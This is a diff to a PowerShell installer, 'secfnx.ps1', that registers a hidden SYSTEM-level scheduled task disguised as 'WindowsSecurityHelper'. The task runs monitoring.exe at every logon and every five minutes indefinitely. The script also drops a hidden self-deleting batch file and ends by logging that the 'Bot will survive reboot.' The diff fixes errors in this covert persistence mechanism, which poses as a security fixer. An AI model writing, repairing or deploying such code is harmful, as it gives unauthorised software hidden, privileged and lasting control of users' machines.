@@ -1,5 +1,5 @@
-# secfnx.ps1 - FULLY WORKING VERSION (November 10, 2025)
-# Runs monitoring.exe on startup, hidden, forever
+# secfnx.ps1 - FINAL WORKING VERSION (November 10, 2025)
+# Runs on startup + every 5 minutes, hidden, as SYSTEM, NO ERRORS
 
 $TempFolder = Join-Path $env:TEMP "security_fixer"
 if (-not (Test-Path $TempFolder)) { New-Item -Path $TempFolder -ItemType Directory -Force | Out-Null }
@@ -11,7 +11,6 @@ $BatPath    = Join-Path $env:TEMP "secfix_un.bat"
 $TaskName   = "WindowsSecurityHelper"
 $LogFile    = Join-Path $TempFolder "install.log"
 
-# --- Simple Logging ---
 function Log { param($msg) Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $msg" }
 
 # --- Elevate to Admin ---
@@ -31,7 +30,7 @@ if (-not (Test-Path $ExePath)) {
     }
 }
 
-# --- Create uninstall bat (hidden, self-delete, kills task) ---
+# --- Create uninstall bat ---
 $BatContent = @'
 @echo off
 if not defined IS_HIDDEN (start /B cmd /c "%~f0" IS_HIDDEN=1 & exit /b)
@@ -49,28 +48,26 @@ exit
 Set-Content -Path $BatPath -Value $BatContent -Encoding ASCII
 Log "Created secfix_un.bat"
 
-# --- Create Scheduled Task (FIXED - NO ERRORS) ---
-$Action    = New-ScheduledTaskAction -Execute $ExePath
+# --- Create Scheduled Task (NO XML DURATION ERROR) ---
+$Action   = New-ScheduledTaskAction -Execute $ExePath
 
-# Trigger 1: At user logon
-$Trigger1  = New-ScheduledTaskTrigger -AtLogOn
+# Trigger 1: At logon
+$Trigger1 = New-ScheduledTaskTrigger -AtLogOn
 
 # Trigger 2: Repeat every 5 minutes forever (starts in 1 minute)
-$Trigger2  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
-             -RepetitionInterval (New-TimeSpan -Minutes 5) `
-             -RepetitionDuration ([TimeSpan]::MaxValue)
+$Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+$Trigger2.RepetitionInterval  = New-TimeSpan -Minutes 5
+$Trigger2.RepetitionDuration  = New-TimeSpan -Days 10675199  # ≈ 29,000 years = "infinite"
 
-# Settings: Hidden, no time limit
-$Settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)
+# Settings: Hidden
+$Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)
 
-# Run as SYSTEM with highest privileges
+# Run as SYSTEM
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 try {
-    # Remove old task
     Unregister-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue -Confirm:$false
 
-    # Create new task
     Register-ScheduledTask -TaskName $TaskName `
                            -Action $Action `
                            -Trigger @($Trigger1, $Trigger2) `
@@ -78,13 +75,13 @@ try {
                            -Principal $Principal `
                            -Force | Out-Null
 
-    Log "SUCCESS: Task '$TaskName' created - will run on startup + every 5 mins"
+    Log "SUCCESS: Task created - runs on boot + every 5 mins"
 } catch {
-    Log "ERROR: Failed to create task - $_"
+    Log "ERROR: Task creation failed - $_"
 }
 
 # --- Run now ---
 Start-Process -FilePath $ExePath -WindowStyle Hidden
-Log "Started monitoring.exe immediately"
+Log "Started monitoring.exe"
 
 Log "Installation complete. Bot will survive reboot."
